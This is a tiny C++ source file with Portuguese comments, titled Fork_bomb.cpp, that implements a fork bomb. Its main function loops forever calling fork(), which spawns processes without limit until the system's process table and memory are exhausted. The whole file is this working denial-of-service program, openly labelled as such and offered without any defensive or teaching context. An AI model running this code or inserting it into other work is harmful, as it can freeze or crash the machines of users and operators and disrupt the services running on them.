/**
 * @file  Fork_bomb.cpp
 * @brief Contém a implementação de um fork boma
 */ 

#include <unistd.h> /// fork()

int main(void)
{
    while(true) {
      fork();
    }
}